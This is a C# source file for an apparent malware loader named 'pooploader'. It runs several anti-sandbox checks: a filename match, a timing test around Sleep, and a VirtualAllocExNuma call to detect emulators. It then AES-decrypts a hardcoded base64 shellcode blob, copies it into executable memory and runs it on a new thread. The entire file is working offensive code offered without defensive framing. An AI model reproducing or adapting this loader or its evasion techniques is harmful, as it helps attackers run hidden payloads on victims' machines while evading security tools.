using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Text;

namespace pooploader
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void evade()
        {
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            Regex filter = new Regex("(.*)(pooploader)(.*)");
            if (!filter.IsMatch(fileName))
            {
                Environment.Exit(0);
            }
            else
            {
                int x = 1;
                while (x < 100)
                {
                    x += 5;
                }
            }

            IntPtr mem = VirtualAllocExNuma((IntPtr)(-1), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); // replaced GetCurrentPrcoess with a pointer to -1
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
        }


        static void Main(string[] args)
        {
            evade();

            string Key = "ie0sf6btebNBlzrX";
            string IV = "tABaQ5Mud8GQQJ2X";
            string buf = "i9fSe+ei9GFH33DRNe42rsMBCbWi+tPhBqklB0L4KeYhmY3mrTHCSE8BLLVBOKUoYZSLEV2j84zyMj6mY8IOybN4q6BnqBIR5A+tV8q0ZJyHJ1v/SfESLJeNreg8X5P9AMK+Mv5FkzILTllY9Kc+hD4weP8BjTNvQmv/azUslT0mYX7WkcxnMTHB1NErlzoYRc6Firg0hXpozVXIZgqrbHWdgqCb5ViClveve3R+muO/LAcJclcjTO6lPORcFEZ72SBTJ06Jxde1SLbtxoX8B6RTyVHo+rGzrA1P8MwraDemQuv4VK77Dv6Qn+igGViOZa/EcJY+2Egk1Iz0WKbCY/9B0Uei02F1068efL63+0flkEF6KwvCpUk+M8vYJ8X6";

            byte[] aesDecrypt(byte[] CEncryptedShell, string key, string iv)
            {
                using (var aes = Aes.Create())
                {
                    aes.KeySize = 128;
                    aes.BlockSize = 128;
                    aes.Padding = PaddingMode.Zeros; // fixed padding to nullbytes
                    aes.Mode = CipherMode.CBC;
                    aes.Key = Encoding.UTF8.GetBytes(key);
                    aes.IV = Encoding.UTF8.GetBytes(iv);
                    using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                    {
                        return GetDecrypt(CEncryptedShell, decryptor);
                    }
                }
            }

            byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
            {
                using (var ms = new MemoryStream())
                using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return ms.ToArray();
                }
            }

            byte[] dec_blob = Convert.FromBase64String(buf);
            byte[] dbuff = aesDecrypt(dec_blob, Key, IV);
            int len = dbuff.Length;
            IntPtr address = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(dbuff, 0, address, len);
            IntPtr poop = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(poop, 0xFFFFFFFF);
        }
    }
}
